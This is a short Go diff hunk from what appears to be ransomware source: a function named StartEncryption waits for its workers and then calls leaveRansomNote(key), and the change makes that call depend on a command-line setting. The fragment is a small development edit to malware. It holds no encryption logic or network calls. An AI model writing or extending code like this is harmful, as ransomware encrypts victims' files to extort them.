@@ -33,7 +33,9 @@ func StartEncryption(q *Queue, key string) int {
 		}()
 	}
 	wg.Wait()
-	leaveRansomNote(key)
+	if cli.Settings.LeaveNote {
+		leaveRansomNote(key)
+	}
 	return 0
 }
 
